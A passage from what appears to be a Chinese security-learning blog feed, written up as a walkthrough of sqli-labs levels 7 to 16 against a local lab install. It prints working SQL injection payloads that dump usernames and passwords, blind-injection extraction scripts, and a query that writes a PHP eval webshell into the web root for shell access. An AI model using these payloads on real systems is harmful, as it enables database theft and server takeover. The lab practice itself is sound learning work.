+<p><a href="https://imgchr.com/i/BoO44s"><img src="https://s1.ax1x.com/2020/11/08/BoO44s.png" alt="BoO44s.png"></a></p>
+<h2 id="Less-7"><a class="header-anchor" href="#Less-7">¶</a>Less-7</h2>
+<p>这题是有关文件读取与注入的。这种题目一般有两个难点。<br>
+1.要有读取文件的权限<br>
+2.要知道绝对物理路径<br>
+对于这道题，我们先经过fuzz确定需要闭合’))。又由于我们是本机操作所以默认知道了绝对路径。因此上传一句话木马。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_post[“t”])?&gt;&#39; into outfile &quot;C:\\vip\\sqli-labs-master\\Less-7\\c.php&quot;--+</span><br></pre></td></tr></table></figure>
+<p>之后使用中国菜刀连接即可getshell。<br>
+注意:地址中的每个\都要在前面加上另外一个\来转义</p>
+<h2 id="Less-8"><a class="header-anchor" href="#Less-8">¶</a>Less-8</h2>
+<p>经过简单测试，这道题我们需要闭合’。和Less-5一样没有显示位。但是和Less-5的区别在于过滤了报错语句，所以我们不能使用报错注入，只能使用布尔盲注和延时注入。在这里我们使用布尔盲注。我这里使用了一个半自动的布尔盲注脚本。</p>
+<p>布尔盲注详细请看大佬: <a href="https://www.cnblogs.com/zane-s/articles/12371820.html#CRWcQXhE">布尔盲注</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and ord(substr(playload,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line">result =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.<span class="built_in">format</span>(i,j)</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			result += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span> (result)</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>playload 那里填入我们的注入的语句</p>
+<h2 id="Less-9"><a class="header-anchor" href="#Less-9">¶</a>Less-9</h2>
+<p>这道题考的是延时注入。经测试，无论输入什么都是返回You are in…所以我们不能根据页面的返回来判断是否执行语句，也就是不能执行布尔注入。</p>
+<p>时间盲注参考大佬:<a href="https://my.oschina.net/u/4368807/blog/4497390">时间盲注</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(5)--+</span><br></pre></td></tr></table></figure>
+<p>我们先进行此语句，发现页面没有立刻返回，说明语句已经被执行。说明我们闭合正确了。我继续用了一个半自动的脚本。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if(ord(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&quot;</span></span><br><span class="line">result  = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.<span class="built_in">format</span>(i,j)</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		time3 = time2 - time1</span><br><span class="line">		<span class="keyword">if</span> time3 &gt; <span class="number">4</span>:</span><br><span class="line">			result += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span> (result)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="Less-10"><a class="header-anchor" href="#Less-10">¶</a>Less-10</h2>
+<p>首先测试闭合。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&#39; and sleep(5)--+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&#39;) and sleep(5)--+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&#39;)) and sleep(5)--+</span><br></pre></td></tr></table></figure>
+<p>测试这上面三个发现都立刻加载出页面，说明语句没有被执行。再测试双引号发现可以被执行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-11"><a class="header-anchor" href="#Less-11">¶</a>Less-11</h2>
+<p>从这关开始就进入post注入的范围了。但是其实post注入和get注入差别不大。<br>
+我们先对username传入admin’# ,密码随便输。可以发现我们登陆成功，显示出了admin账号的密码。接下来的注入过程类似Less-1。<br>
+先用order by判断出有两个字段。再依次对username进行传参。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&#39; union select 1,database()#</span><br><span class="line">username&#x3D;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line">username&#x3D;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">username&#x3D;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#</span><br></pre></td></tr></table></figure>
+<p>至于这个过程,password可以随便输入。因为当你传进去username的参数后，后台的sql语句变成这样：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>可以看出，password部分已经被我们注释掉了，从而达到了绕过的目的。</p>
+<h2 id="Less-12"><a class="header-anchor" href="#Less-12">¶</a>Less-12</h2>
+<p>这一关和Less-11几乎一样，只是闭合方式从’变成了”)，改变闭合方式后剩余步骤模仿Less-11就行。 这里解释一下一个问题，就是我们对username传入1’ or 1=1#后发现我们是以dumb账号登陆。这里是因为他在语句后面加了limit限制只允许输出一条数据的原因，而dumb账号在表中的优先级是最高的，所以优先输出dumb账户的数据。</p>
+<h2 id="Less-13"><a class="header-anchor" href="#Less-13">¶</a>Less-13</h2>
+<p>经测试，可用’)来进行闭合，但是闭合后发现没有显示位，测试了一下发现可以使用报错注入。这次我使用extractvalue()报错。<br>
+依次对username进行传参。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:1&#39;) and extractvalue(1,concat(1,database()))#</span><br><span class="line">username:1&#39;) and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)))#</span><br><span class="line">username:1&#39;) and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)))#</span><br><span class="line">username:1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#</span><br></pre></td></tr></table></figure>
+<h2 id="Less-14"><a class="header-anchor" href="#Less-14">¶</a>Less-14</h2>
+<p>这道题和上一道题基本一样，只是转换闭合方式为 “。之后步骤模仿Less-13即可</p>
+<h2 id="Less-15"><a class="header-anchor" href="#Less-15">¶</a>Less-15</h2>
+<p>页面有回显，但是无法使用报错注入。故使用布尔盲注。<br>
+这里继续用一个半自动的脚本来解决:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-15&#x2F;&quot;</span><br><span class="line">result &#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,10):</span><br><span class="line">	for j in range(65,150):</span><br><span class="line">		payload1 &#x3D; &quot;admin&#39;^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1#&quot;.format(i,j)</span><br><span class="line">		payload2 &#x3D; &quot;admin&#39;^(ascii(mid(database()from &#123;&#125;))&gt;&#123;&#125;)^1%23&quot;.format(i,j)</span><br><span class="line">		data &#x3D; &#123;&quot;uname&quot;:payload1,&quot;passwd&quot;:&quot;123&quot;&#125;</span><br><span class="line">		r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">		if &quot;slap.jpg&quot; in r.text:</span><br><span class="line">			result +&#x3D; chr(j)</span><br><span class="line">			print result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+<h2 id="Less-16"><a class="header-anchor" href="#Less-16">¶</a>Less-16</h2>
+<p>这道题和Less-15基本一样。只不过把闭合换成了”)而已，只需要更改脚本即可得出结果。</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
